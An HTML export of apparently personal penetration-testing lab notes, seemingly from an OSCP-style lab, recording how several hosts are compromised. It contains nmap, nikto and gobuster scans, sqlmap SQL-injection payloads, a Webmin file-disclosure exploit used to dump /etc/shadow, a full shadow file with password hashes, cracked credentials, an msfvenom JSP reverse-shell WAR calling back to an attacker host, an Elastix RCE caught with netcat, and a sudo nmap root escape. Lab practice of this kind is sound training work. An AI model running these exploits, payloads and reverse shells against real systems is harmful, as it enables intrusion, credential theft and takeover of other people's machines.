/>4167/tcp  open  ddgn<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />5985/tcp  open  wsman<br />47001/tcp open  winrm<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz</div><div class='page'><h1 class='title level-5'>web</h1><br/>PORT     STATE SERVICE REASON  VERSION<br />4167/tcp open  http    syn-ack Microsoft IIS httpd 8.5<br />|_http-server-header: Microsoft-IIS/8.5<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />PORT     STATE SERVICE  REASON  VERSION<br />5800/tcp open  vnc-http syn-ack TightVNC (user: dj; VNC TCP port: 5900)<br /><br /><br /><br /><br />nikto -host http://10.11.1.128:4167<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.128<br />+ Target Hostname:    10.11.1.128<br />+ Target Port:        4167<br />+ Start Time:         2020-05-09 12:00:35 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/8.5<br />+ Retrieved x-powered-by header: ASP.NET<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Retrieved x-aspnet-version header: 2.0.50727<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Cookie ASPSESSIONIDQCCBBQDR created without the httponly flag<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ /login.asp: Admin login page/section found.<br />+ 7918 requests: 0 error(s) and 9 item(s) reported on remote host<br />+ End Time:           2020-05-09 12:10:47 (GMT-4) (612 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /><br /><br /><br /><br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            http://10.11.1.128:4167/<br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Extensions:     asp<br />[+] Timeout:        10s<br />===============================================================<br />2020/05/09 12:10:52 Starting gobuster<br />===============================================================<br />/Login.asp (Status: 200)<br />/Search.asp (Status: 302)<br />/aspnet_client (Status: 301)<br />/login.asp (Status: 200)<br />/search.asp (Status: 302)<br />===============================================================<br />2020/05/09 12:12:01 Finished<br />===============================================================<br /></div><div class='page'><h1 class='title level-5'>sql</h1><br/>POST parameter &#39;artist&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] <br />sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:<br />---<br />Parameter: artist (POST)<br />    Type: stacked queries<br />    Title: Microsoft SQL Server/Sybase stacked queries (comment)<br />    Payload: artist=yeet&#39;;WAITFOR DELAY &#39;0:0:5&#39;--<br />    Vector: ;IF([INFERENCE]) WAITFOR DELAY &#39;0:0:[SLEEPTIME]&#39;--<br /><br />    Type: UNION query<br />    Title: Generic UNION query (NULL) - 2 columns<br />    Payload: artist=yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(77)+CHAR(87)+CHAR(65)+CHAR(119)+CHAR(101)+CHAR(88)+CHAR(102)+CHAR(88)+CHAR(107)+CHAR(74)+CHAR(73)+CHAR(66)+CHAR(112)+CHAR(87)+CHAR(121)+CHAR(70)+CHAR(117)+CHAR(67)+CHAR(111)+CHAR(84)+CHAR(88)+CHAR(89)+CHAR(99)+CHAR(97)+CHAR(105)+CHAR(77)+CHAR(110)+CHAR(67)+CHAR(122)+CHAR(121)+CHAR(72)+CHAR(78)+CHAR(120)+CHAR(119)+CHAR(112)+CHAR(100)+CHAR(105)+CHAR(73)+CHAR(70)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- Wlvu<br />    Vector:  UNION ALL SELECT [QUERY],NULL[GENERIC_SQL_COMMENT]<br />---<br />[18:14:09] [INFO] testing Microsoft SQL Server<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (UNICODE(SQUARE(NULL)) IS NULL) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- vxmt<br />[18:14:09] [DEBUG] performed 1 queries in 0.16 seconds<br />[18:14:09] [INFO] confirming Microsoft SQL Server<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (CHARINDEX(CHAR(49)+CHAR(53)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)&gt;0) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- OwPt<br />[18:14:09] [DEBUG] performed 1 queries in 0.10 seconds<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (@@VERSION LIKE CHAR(37)+CHAR(65)+CHAR(122)+CHAR(117)+CHAR(114)+CHAR(101)+CHAR(37)) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- rdTR<br />[18:14:09] [DEBUG] performed 1 queries in 0.11 seconds<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (TRIM(NULL) IS NULL) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- uATV<br />[18:14:09] [DEBUG] got HTTP error code: 500 (&#39;Internal Server Error&#39;)<br />[18:14:09] [DEBUG] performed 1 queries in 0.09 seconds<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (ISJSON(NULL) IS NULL) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- kroN<br />[18:14:09] [DEBUG] got HTTP error code: 500 (&#39;Internal Server Error&#39;)<br />[18:14:09] [DEBUG] performed 1 queries in 0.10 seconds<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (CHARINDEX(CHAR(49)+CHAR(50)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)&gt;0) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- tUxt<br />[18:14:09] [DEBUG] turning off reflection removal mechanism (for optimization purposes)<br />[18:14:09] [DEBUG] performed 1 queries in 0.10 seconds<br />[18:14:09] [PAYLOAD] yeet&#39; UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(98)+CHAR(113)+(CASE WHEN (CONCAT(NULL,NULL)=CONCAT(NULL,NULL)) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(120)+CHAR(113),NULL-- rMLp<br />[18:14:09] [DEBUG] performed 1 queries in 0.09 seconds<br />[18:14:09] [INFO] the back-end DBMS is Microsoft SQL Server<br />back-end DBMS: Microsoft SQL Server 2012<br />[18:14:09] [WARNING] HTTP error codes detected during run:<br />500 (Internal Server Error) - 24 times<br />[18:14:09] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/10.11.1.128&#39;<br />[18:14:09] [WARNING] you haven&#39;t updated sqlmap for more than 98 days!!!<br /><br />[*] ending @ 18:14:09 /2020-05-09/<br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1042-1.png" alt="images/1042-1.png" /></a><br /><br /><a href=""><img src="images/1042-2.png" alt="images/1042-2.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.141 FC4 rooted</h1><br/>nmap showed that 22, 111, 10000 were all open. <br />10000 was running a webserver with webmin.<br />searchsploit webmin showed an arbitrary file disclosure.<br /><a href=""><img src="images/1060-1.png" alt="images/1060-1.png" /></a><br /><br />useing the php one I was able to dump /etc/passwd<br />    php -f 1997.php 10.11.1.141 10000 http /etc/passwd<br />I was also able to dump /etc/shadow<br />with /etc/shadow and /etc/passwd I was able to copy paste the output to files and run unshadow.<br />unshadow 141passwd 141shadow &gt; 141hash<br />john --wordlist=/Yeet/Tools/Wordlists/rockyou.txt 141hash<br />I now have the creds<br />    alice:loading1<br />    bob:BUGZBUNNY<br /><br />sshing in was a huge pain becasue I was getting the error<br />    Unable to negotiate with 10.11.1.141 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1<br />the fix was to run<br />    ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 alice@10.11.1.141<br />    <br />By all reasonable thoughts, the machine should be vulnerable to a kernel exploit, but alas, it is not.<br /><br />Fortunatley, the webserver is running as root. (We know this because we were able to dump /etc/shadow and /root/proof.txt).<br />Often whatever file extension the webserver is running as (in this case CGI) will execute as that language (in this case .pl) if you LFI to a .cgi file.<br /><br />php -f 1997.php 10.11.1.141 10000 http /tmp/3232.cgi<br />rooted!<br /><br /><br /><br /><br /><br />8aafac90ff1c985236b1593e84709fb0</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>OpenBSD? 2005?<br /><br /><br />Creds<br />alice<br />loading1<br />bob<br />BUGZBUNNY<br /><br /><br />ke from sh<br /><br />/log.d/scripts/logwatch.pl</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.141 &amp;&amp; nmap -sC -sV -Pn 10.11.1.141 &amp;&amp; nmap -p- -Pn 10.11.1.141 &amp;&amp; nmap -Pn -p- -sU 10.11.1.141<br />ttl=63<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 11:15 EDT<br />Nmap scan report for 10.11.1.141<br />Host is up (0.067s latency).<br />Not shown: 997 closed ports<br />PORT      STATE SERVICE<br />22/tcp    open  ssh<br />111/tcp   open  rpcbind<br />10000/tcp open  snet-sensor-mgmt<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 11:15 EDT<br />Nmap scan report for 10.11.1.141<br />Host is up (0.080s latency).<br />Not shown: 997 closed ports<br />PORT      STATE SERVICE VERSION<br />22/tcp    open  ssh     OpenSSH 4.0 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 fe:cd:bb:f6:36:d4:59:62:92:b4:10:e4:75:04:43:54 (DSA)<br />|_  1024 9a:99:25:75:ac:04:e5:f9:f7:21:c6:f5:88:4f:12:6a (RSA)<br />111/tcp   open  rpcbind 2 (RPC #100000)<br />10000/tcp open  http    MiniServ 0.01 (Webmin httpd)<br />|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 11:15 EDT<br />Nmap scan report for 10.11.1.141<br />Host is up (0.063s latency).<br />Not shown: 65532 closed ports<br />PORT      STATE SERVICE<br />22/tcp    open  ssh<br />111/tcp   open  rpcbind<br />10000/tcp open  snet-sensor-mgmt<br /><br />Nmap done: 1 IP address (1 host up) scanned in 65.86 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-5'>shadow</h1><br/>root:$1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0:16903:0:99999:7:::<br />bin:*:13653:0:99999:7:::<br />daemon:*:13653:0:99999:7:::<br />adm:*:13653:0:99999:7:::<br />lp:*:13653:0:99999:7:::<br />sync:*:13653:0:99999:7:::<br />shutdown:*:13653:0:99999:7:::<br />halt:*:13653:0:99999:7:::<br />mail:*:13653:0:99999:7:::<br />news:*:13653:0:99999:7:::<br />uucp:*:13653:0:99999:7:::<br />operator:*:13653:0:99999:7:::<br />games:*:13653:0:99999:7:::<br />gopher:*:13653:0:99999:7:::<br />ftp:*:13653:0:99999:7:::<br />nobody:*:13653:0:99999:7:::<br />dbus:!!:13653:0:99999:7:::<br />vcsa:!!:13653:0:99999:7:::<br />rpm:!!:13653:0:99999:7:::<br />haldaemon:!!:13653:0:99999:7:::<br />pcap:!!:13653:0:99999:7:::<br />nscd:!!:13653:0:99999:7:::<br />named:!!:13653:0:99999:7:::<br />netdump:!!:13653:0:99999:7:::<br />sshd:!!:13653:0:99999:7:::<br />rpc:!!:13653:0:99999:7:::<br />mailnull:!!:13653:0:99999:7:::<br />smmsp:!!:13653:0:99999:7:::<br />rpcuser:!!:13653:0:99999:7:::<br />nfsnobody:!!:13653:0:99999:7:::<br />apache:!!:13653:0:99999:7:::<br />squid:!!:13653:0:99999:7:::<br />webalizer:!!:13653:0:99999:7:::<br />xfs:!!:13653:0:99999:7:::<br />ntp:!!:13653:0:99999:7:::<br />mysql:!!:13653:0:99999:7:::<br />bob:$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:16903:0:99999:7:::<br />alice:$1$BfWG661G$ye24xqRQEx.nq.bZTATwf.:16917:0:99999:7:::<br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1063-1.png" alt="images/1063-1.png" /></a><br /><br /><a href=""><img src="images/1063-2.png" alt="images/1063-2.png" /></a><br /><br /><a href=""><img src="images/1063-3.png" alt="images/1063-3.png" /></a><br /><br /><a href=""><img src="images/1063-4.png" alt="images/1063-4.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.146 Susie rooted</h1><br/>Nmap showed that ssh and smb were the only things happening.<br />nmap showed that machine was running samba 4.5<br />searchsploit for sama 4.5 showed a potential msf exploit.<br /><a href=""><img src="images/1067-1.png" alt="images/1067-1.png" /></a><br /><br />I found the smb_shrare_name from my smb enum script<br /><br /><a href=""><img src="images/1067-2.png" alt="images/1067-2.png" /></a><br /><br />ran it and rooted!<br />Note--<br />There was a ton of stuff on this machine to make it look like it may be running a windows share. rpcclient had me 99% convinced that the machine was windows. The SSH version was vulnerable to an exploit that would leak usernames. That is what convinced me 100% that is was ubuntu (or at least Linux).<br /><br /><br /><br />78279a04f7020f4fb4599242fcfe70af</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>S-1-22-1-1000 Unix User\susie (Local User)<br /><br /><br />Windows 7&lt;&lt;nope def def linux<br /><br />	SUSIE          Wk Sv PrQ Unx NT SNT susie server (Samba, Ubuntu)<br />	platform_id     :	500<br />	os version      :	6.1<br />	server type     :	0x809a03<br /></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.146 &amp;&amp; nmap -sC -sV -Pn 10.11.1.146 &amp;&amp; nmap -p- -Pn 10.11.1.146 &amp;&amp; nmap -Pn -p- -sU 10.11.1.146<br />ttl=63<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 13:26 EDT<br />Nmap scan report for 10.11.1.146<br />Host is up (0.080s latency).<br />Not shown: 997 filtered ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 13:27 EDT<br />Nmap scan report for 10.11.1.146<br />Host is up (0.079s latency).<br />Not shown: 997 filtered ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 e3:73:a9:48:81:9d:90:bc:70:75:81:8a:3d:e8:95:6f (RSA)<br />|   256 0e:76:22:d0:20:ca:1e:96:e9:7b:a5:9a:86:e7:f6:d4 (ECDSA)<br />|_  256 57:e1:e4:06:a3:79:6d:03:53:6c:d6:7b:67:ed:86:dc (ED25519)<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp open  netbios-ssn Samba smbd 4.5.4-Ubuntu (workgroup: WORKGROUP)<br />Service Info: Host: SUSIE; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 1h16m56s, deviation: 2h18m35s, median: -3m04s<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.5.4-Ubuntu)<br />|   Computer name: \x00<br />|   NetBIOS computer name: SUSIE\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2020-05-15T13:24:24-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-15T17:24:22<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 58.98 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 13:28 EDT<br />Nmap scan report for 10.11.1.146<br />Host is up (0.065s latency).<br />Not shown: 65532 filtered ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 127.31 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-4'>pictures</h1><br/><a href=""><img src="images/1069-1.png" alt="images/1069-1.png" /></a><br /><br /><a href=""><img src="images/1069-2.png" alt="images/1069-2.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.209 Kraken rooted</h1><br/>nmap showed that 8080 was running apache tomcat.<br />Nikto showed me that /manager/html was useing the default login tomcat:s3cret<br />navigated there and logged in!<br /><br />The tomcat web application manager allows you to upload .war file (compressed java)<br />msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f war &gt; 443.war<br /><a href=""><img src="images/1071-1.png" alt="images/1071-1.png" /></a><br />nc listener<br />clicked on the file I just uploaded...<br />rooted!<br /><br /><br /><br />657dd1ac919a586169dd8bf519d3429f</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=254e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.209 &amp;&amp; nmap -sC -sV -Pn 10.11.1.209 &amp;&amp; nmap -p- -Pn 10.11.1.209 &amp;&amp; nmap -Pn -p- -sU 10.11.1.209<br />ttl=254<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 15:05 EDT<br />Nmap scan report for 10.11.1.209<br />Host is up (0.064s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />111/tcp  open  rpcbind<br />515/tcp  open  printer<br />8009/tcp open  ajp13<br />8080/tcp open  http-proxy<br /><br />Nmap done: 1 IP address (1 host up) scanned in 29.52 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 15:06 EDT<br />Nmap scan report for 10.11.1.209<br />Host is up (0.065s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE  VERSION<br />22/tcp   open  ssh      OpenSSH 7.5 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 a1:33:be:71:1a:0a:48:ef:82:90:e1:9c:f4:3e:ae:0c (RSA)<br />|_  256 91:d4:3c:25:ce:97:72:4b:55:3c:fe:d4:3b:23:c4:8e (ED25519)<br />111/tcp  open  rpcbind  2-4 (RPC #100000)<br />515/tcp  open  printer?<br />8009/tcp open  ajp13    Apache Jserv (Protocol v1.3)<br />| ajp-methods: <br />|_  Supported methods: GET HEAD POST OPTIONS<br />8080/tcp open  http     Apache Tomcat 9.0.27<br />|_http-favicon: Apache Tomcat<br />|_http-title: Apache Tomcat/9.0.27<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 284.46 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 15:11 EDT<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>nikto -host <a href="http://10.11.1.209:8080">http://10.11.1.209:8080</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.209<br />+ Target Hostname:    10.11.1.209<br />+ Target Port:        8080<br />+ Start Time:         2020-05-15 15:12:51 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: No banner retrieved<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community<br />+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS <br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.<br />+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.<br />+ Default account found for &#39;Tomcat Manager Application&#39; at /manager/html (ID &#39;tomcat&#39;, PW &#39;s3cret&#39;). Apache Tomcat.<br />+ /host-manager/html: Default Tomcat Manager / Host Manager interface found<br />+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)<br />+ /manager/status: Tomcat Server Status interface found (pass protected)<br />+ 8019 requests: 0 error(s) and 13 item(s) reported on remote host<br />+ End Time:           2020-05-15 15:24:15 (GMT-4) (684 seconds)<br />-------------------</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1073-1.png" alt="images/1073-1.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>10.11.1.217 Hotline rooted</h1><br/>Nmap showed that an assload of ports were open.<br />80 and 443 both led me to Elastix, which I worked on before duting HTB Beep.<br />at the login page for Elastix I used the default login admin:admin... we are in!!<br />I was able to verify that the version was 2.2.0.<br />searchsploit showed me that there was a remote code execution exploit (which I now know you could (maybe) acutlly get without logging in).<br /><a href=""><img src="images/1076-1.png" alt="images/1076-1.png" /></a><br /><br />I was not able to get the 18650.py exploit to send due to some ssl error, so I had it just print the url it was going to navigate to (already URL encoded, with my ip , lport, and extension to call).<br /><a href=""><img src="images/1076-2.png" alt="images/1076-2.png" /></a><br /><br />throw that in burp, send it, and catch it in nc<br /><a href=""><img src="images/1076-3.png" alt="images/1076-3.png" /></a><br /><a href=""><img src="images/1076-4.png" alt="images/1076-4.png" /></a><br /><br />sudo nmap --interactive<br />!sh<br />rooted!<br /><br />Note, this exploit is dependent upon extension 1000 existing. it is the default test extension, so there is a good chance, but you may have to add an extension and point to that instead.<br /><br /><br /><br />ffb5d84a211ae8398d6ae474f2242af3</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>OpenBSD?<br /><br />22 &gt; OpenBSD<br />25 &gt; smtp, nothing special<br />80 web<br />110 &gt; un enumerated<br />111 &gt; no login (rpcclient)<br />443 web<br />3306 &gt; nothing special<br />4445 &gt; nothing special<br />9090 web<br /><br /><br />80 &gt; elastix <br />    admin:admin<br />    elastix 2.2</div><div class='page'><h1 class='title level-5'>nmap</h1><br/></div><div class='page'><h1 class='title level-5'>web</h1><br/>PORT     STATE SERVICE REASON  VERSION<br />9090/tcp open  http    syn-ack Jetty (Openfire chat server http admin)     --&gt; Openfire 3.5.1<br /><a href=""><img src="images/1080-1.png" alt="images/1080-1.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1079-1.png" alt="images/1079-1.png" /></a><br /><br /><a href=""><img src="images/1079-2.png" alt="images/1079-2.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.223 Jeff rooted</h1><br/>Nmap showed that the machine was running a webserver on port 80.<br />Visiting the webpage showed that the machine was running ApPHP MicroBlog 1.0.2<br />Searchsploit showed me that there was a RCE for 1.0.1<br />python 33070.py http://10.11.1.223/index.php<br />rooted!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />0c97f13935ebe93bdea97f0e59fe256dnt</div><div class='page'><h1 class='title level-4'>enuemration</h1><br/>Windows 10.0 Build 17763 x64<br /><br />names<br />nicky<br />admin</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.223 &amp;&amp; nmap -sC -sV -Pn 10.11.1.223 &amp;&amp; nmap -p- -Pn 10.11.1.223 &amp;&amp; nmap -Pn -p- -sU 10.11.1.223<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 11:35 EDT<br />Nmap scan report for 10.11.1.223<br />Host is up (0.071s latency).<br />Not shown: 992 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />443/tcp  open  https<br />445/tcp  open  microsoft-ds<br />3306/tcp open  mysql<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 11:35 EDT<br />Nmap scan report for 10.11.1.223<br />Host is up (0.051s latency).<br />Not shown: 992 closed ports<br />PORT     STATE SERVICE       VERSION<br />21/tcp   open  ftp           FileZilla ftpd<br />| ftp-syst: <br />|_  SYST: UNIX emulated by FileZilla<br />80/tcp   open  http          Apache httpd 2.4.38 ((Win64) OpenSSL/1.0.2q PHP/5.6.40)<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />|_http-server-header: Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40<br />|_http-title: ApPHP MicroBlog<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />443/tcp  open  ssl/http      Apache httpd 2.4.38 ((Win64) OpenSSL/1.0.2q PHP/5.6.40)<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />|_http-server-header: Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40<br />|_http-title: ApPHP MicroBlog<br />| ssl-cert: Subject: commonName=localhost<br />| Not valid before: 2009-11-10T23:48:47<br />|_Not valid after:  2019-11-08T23:48:47<br />|_ssl-date: TLS randomness does not represent time<br />| tls-alpn: <br />|_  http/1.1<br />445/tcp  open  microsoft-ds?<br />3306/tcp open  mysql         MariaDB (unauthorized)<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: JEFF<br />|   NetBIOS_Domain_Name: JEFF<br />|   NetBIOS_Computer_Name: JEFF<br />|   DNS_Domain_Name: jeff<br />|   DNS_Computer_Name: jeff<br />|   Product_Version: 10.0.17763<br />|_  System_Time: 2020-05-18T15:33:12+00:00<br />| ssl-cert: Subject: commonName=jeff<br />| Not valid before: 2020-01-20T21:20:10<br />|_Not valid after:  2020-07-21T21:20:10<br />|_ssl-date: 2020-05-18T15:33:20+00:00; -2m15s from scanner time.<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m15s, deviation: 0s, median: -2m15s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-18T15:33:15<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 11:35 EDT<br />Nmap scan report for 10.11.1.223<br />Host is up (0.066s latency).<br />Not shown: 65517 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />443/tcp   open  https<br 